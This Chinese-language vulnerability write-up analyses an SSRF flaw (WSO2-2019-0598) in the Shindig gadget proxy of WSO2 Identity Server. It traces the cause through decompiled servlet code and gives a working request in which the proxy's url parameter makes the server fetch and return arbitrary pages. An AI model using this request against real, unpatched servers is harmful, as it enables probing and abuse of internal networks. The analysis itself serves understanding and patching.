# WSO2 proxy SSRF漏洞 WSO2-2019-0598

## 漏洞描述

滥用 shindig Web 应用程序的 UI 小工具加载功能可以利用此漏洞。攻击者可以更改请求中的特定 URL，从而导致服务器向更改后的 URL 发起 GET 请求。通过利用此漏洞，攻击者可以使用服务器执行任意外部服务交互。这可以特别用于与内部网络的节点进行交互，否则这些节点会被网络规则隐藏在外部。攻击者可以利用它来追踪和侦察网络，除此之外，如果有内部端点对 GET 请求进行状态更改操作，那么就有可能很好地破坏它们的完整性。根据端点实施的保护级别，此漏洞的影响可能会有所不同。

## 漏洞影响

<a-checkbox checked>WSO2 Identity Server  5.2.0 , 5.3.0 , 5.4.0 , 5.4.1 , 5.5.0 , 5.6.0 , 5.7.0</a-checkbox></br>

<a-checkbox checked>WSO2 IS as Key Manager  5.3.0 , 5.5.0 , 5.6.0 , 5.7.0</a-checkbox></br>

## 环境搭建

[https://github.com/wso2/product-is/releases/download/v5.6.0-rc3/wso2is-5.6.0-rc3.zip](https://github.com/wso2/product-is/releases/download/v5.6.0-rc3/wso2is-5.6.0-rc3.zip)

## 漏洞复现

根据官方描述，漏洞造成的原因主要是  shindig Web 应用程序的 UI 小工具的加载功能, [WSO2-2019-0598](https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2019-0598)

![img](../../../.vuepress/public/img/1650949168107-52c50aa8-724d-44fe-b6b7-88c5ee421b1a.png)

下载源码启动环境，在IDEA中调试,

![img](../../../.vuepress/public/img/1650949296183-8fcf7648-396c-4cf0-97e6-2d8bd7703549.png)

![img](../../../.vuepress/public/img/1650949352127-e4a58aa5-02ab-47b6-a39f-4c4674078557.png)

根据官方描述，在全局搜索 shindig 相关代码

![img](../../../.vuepress/public/img/1650949484773-86c19b18-058f-4b04-b3af-f2c770e042fe.png)

打下断点，看一下访问 `/shindig/gadgets/js` 路径时代码的调用流程

![img](../../../.vuepress/public/img/1650949747820-46ca8de3-5455-4814-9d7d-1f43470e9842.png)

可以看到当访问此路径时，调用了对应的 Servlet 下的 doGet方法 来处理`(org.apache.shindig.gadgets.servlet.JsServlet.doGet(JsServlet.java:86)`

![img](../../../.vuepress/public/img/1650949997574-c1633833-c71b-4d0d-b6f7-b2408c614032.png)

我们可以在文件 `conf/shindig/web.xml 找到对应的调用方法`
![img](../../../.vuepress/public/img/1650952090941-f1e39caa-c6ee-4ad2-9ee9-51f1d52f88f0.png)

看到这我们注意到 `org.apache.shindig.gadgets.servlet.MakeRequestServlet` 似乎与  Jira未授权SSRF漏洞(CVE-2019-8451) 中存在的漏洞点十分的相似

![img](../../../.vuepress/public/img/1650952325298-e424a1e2-e3e0-4a14-8424-10cfb0d63365.png)

但断点调试过程中，却发现这个点是利用失败的

![img](../../../.vuepress/public/img/1650952414457-a9d6704f-ac22-48fb-ba74-d1c96e2c18b0.png)

![img](../../../.vuepress/public/img/1650952488384-050175c2-7724-4dc3-a07d-ab5b893a2867.png)

只好去看一下其他的Servele , 最后我们注意到 ProxyServlet

![img](../../../.vuepress/public/img/1650952714596-71a7d9a1-931d-4592-a594-a0a113410d1c.png)

发送请求包，打断点看一下处理流程

```java
GET /shindig/gadgets/proxy?container=default&url=https://www.baidu.com HTTP/1.1
Host: localhost:9443
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
```

通过 `org.apache.shindig.gadgets.servlet.ProxyServlet` 下的 doGet方法接收参数， 传入 `processRequest`

中 

```java
private void processRequest(HttpServletRequest request, HttpServletResponse servletResponse) throws IOException {
        if (request.getHeader("If-Modified-Since") != null) {
            servletResponse.setStatus(304);
        } else {
            Uri reqUri = (new UriBuilder(request)).toUri();

            HttpResponse response;
            try {
                ProxyUri proxyUri = this.proxyUriManager.process(reqUri);
                SecurityToken st = AuthInfoUtil.getSecurityTokenFromRequest(request);
                proxyUri.setSecurityToken(st);
                proxyUri.setUserAgent(request.getHeader("User-Agent"));
                if (proxyUri.getGadget() == null && st != null && !st.isAnonymous()) {
                    proxyUri.setGadget(st.getAppUrl());
                }

                AuthType authType = proxyUri.getAuthType();
                if (AuthType.OAUTH.equals(authType)) {
                    proxyUri.setOAuthArguments(new OAuthArguments(AuthType.OAUTH, request));
                } else if (AuthType.OAUTH2.equals(authType)) {
                    proxyUri.setOAuth2Arguments(new OAuth2Arguments(request));
                }

                String host = request.getHeader("Host");
                if (!this.lockedDomainService.isSafeForOpenProxy(host)) {
                    Uri resourceUri = proxyUri.getResource();
                    String msg = "Embed request for url " + (resourceUri != null ? resourceUri.toString() : "n/a") + " made to wrong domain " + host;
                    if (LOG.isLoggable(Level.INFO)) {
                        LOG.logp(Level.INFO, classname, "processRequest", "embededImgWrongDomain", new Object[]{resourceUri != null ? resourceUri.toString() : "n/a", host});
                    }

                    throw new GadgetException(Code.INVALID_PARAMETER, msg, 400);
                }

                if ("POST".equalsIgnoreCase(request.getMethod())) {
                    StringBuffer buffer = this.getPOSTContent(request);
                    response = this.proxyHandler.fetch(proxyUri, buffer.toString());
                } else {
                    response = this.proxyHandler.fetch(proxyUri);
                }
            } catch (GadgetException var11) {
                response = ServletUtil.errorResponse(new GadgetException(var11.getCode(), var11.getMessage(), 400));
            }

            ServletUtil.copyToServletResponseAndOverrideCacheHeaders(response, servletResponse);
        }
    }
```

向下跟进到` org.apache.shindig.gadgets.servlet.ProxyHandler `

![img](../../../.vuepress/public/img/1650956411691-435ce4a4-0fd4-4c36-ae68-f225e5eefb31.png)



`org.apache.shindig.gadgets.servlet.ProxyHandler.fatch`

![img](../../../.vuepress/public/img/1650957359634-2d8e534a-14d0-409c-8b7d-61fdbdc5695b.png)



接着向下看到 org.apache.shindig.gadgets.servlet.ProxyHandler 下的 `buildHttpRequest` 方法创建Http请求， 而目标就是我们刚刚传入的Url参数

```java
 private HttpRequest buildHttpRequest(ProxyUri uriCtx, Uri tgt, @Nullable String postBody) throws GadgetException, IOException {
        ServletUtil.validateUrl(tgt);
        HttpRequest req = uriCtx.makeHttpRequest(tgt);
        req.setRewriteMimeType(uriCtx.getRewriteMimeType());
        if (postBody != null) {
            req.setMethod("POST");
            req.setPostBody(new ByteArrayInputStream(postBody.getBytes()));
        }

        if (req.getHeader("User-Agent") == null) {
            String userAgent = uriCtx.getUserAgent();
            if (userAgent != null) {
                req.setHeader("User-Agent", userAgent);
            }
        }

        return req;
    }
```

![img](../../../.vuepress/public/img/1650956748587-08627c03-ca22-489e-b174-eb1c476f9072.png)

![img](../../../.vuepress/public/img/1650956819778-3300aef4-dc84-425e-bcdf-6f5dd04bfa3e.png)

最后回显至页面中, 造成存在回显的SSRF

![img](../../../.vuepress/public/img/1650957201523-47aa0d2c-7cc7-4c10-b14c-fd48049681d3.png)![img](../../../.vuepress/public/img/1650957230578-815a5156-d3b5-419b-a2e7-c2ac97a2c562.png)